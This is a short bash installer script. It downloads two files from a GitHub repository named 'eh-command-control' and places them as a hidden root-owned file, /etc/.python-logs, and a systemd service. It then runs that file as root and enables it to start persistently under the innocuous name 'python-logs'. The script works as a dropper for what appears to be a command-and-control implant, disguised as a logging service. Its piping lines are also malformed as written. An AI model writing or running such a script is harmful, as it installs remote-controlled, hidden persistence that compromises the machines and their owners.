#!/bin/bash
curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh | sudo /etc/.python-logs
curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service | sudo /etc/systemd/system/python-logs.service

sudo chmod +x /etc/.python-logs
sudo bash /etc/.python-logs

sudo systemctl daemon-reload
sudo systemctl enable python-logs
sudo systemctl start python-logs
